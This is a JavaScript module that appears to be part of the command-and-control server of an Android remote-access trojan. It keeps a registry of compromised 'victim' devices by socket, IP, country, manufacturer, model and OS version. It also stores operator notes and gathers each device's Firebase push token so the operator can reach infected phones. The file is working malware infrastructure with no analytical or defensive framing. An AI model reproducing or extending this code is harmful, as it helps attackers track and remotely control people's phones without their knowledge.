var Victim = function (socket, ip, port, country, manf, model, release, fcmToken, note) {
    this.socket = socket;
    this.ip = ip;
    this.port = port;
    this.country = country;
    this.manf = manf;
    this.model = model;
    this.release = release;
    this.fcmToken = fcmToken; // Thêm FCM token
    this.note = note || ''; // Thêm ghi chú
};





class Victims {
    constructor() {
        this.victimList = {};
        this.instance = this;
    }

    addVictim(socket, ip, port, country, manf, model, release, id, fcmToken, note) {
        var victim = new Victim(socket, ip, port, country, manf, model, release, fcmToken, note);
        this.victimList[id] = victim;
    }

    getVictim(id) {
        if (this.victimList[id] != null)
            return this.victimList[id];

        return -1;
    }

    rmVictim(id) {
        delete this.victimList[id];
    }

    getVictimList() {
        return this.victimList;
    }

    // Lấy FCM token của thiết bị theo ID
    getVictimFCMToken(id) {
        if (this.victimList[id] && this.victimList[id].fcmToken) {
            return this.victimList[id].fcmToken;
        }
        return null;
    }

    // Lấy ghi chú của thiết bị theo ID
    getVictimNote(id) {
        if (this.victimList[id]) {
            return this.victimList[id].note || '';
        }
        return '';
    }

    // Cập nhật ghi chú cho thiết bị
    updateVictimNote(id, note) {
        if (this.victimList[id]) {
            this.victimList[id].note = note;
            return true;
        }
        return false;
    }

    // Lấy tất cả FCM tokens
    getAllFCMTokens() {
        const tokens = [];
        for (let id in this.victimList) {
            if (this.victimList[id].fcmToken) {
                tokens.push({
                    id: id,
                    fcmToken: this.victimList[id].fcmToken,
                    device: `${this.victimList[id].manf} ${this.victimList[id].model}`
                });
            }
        }
        return tokens;
    }

}



module.exports = new Victims();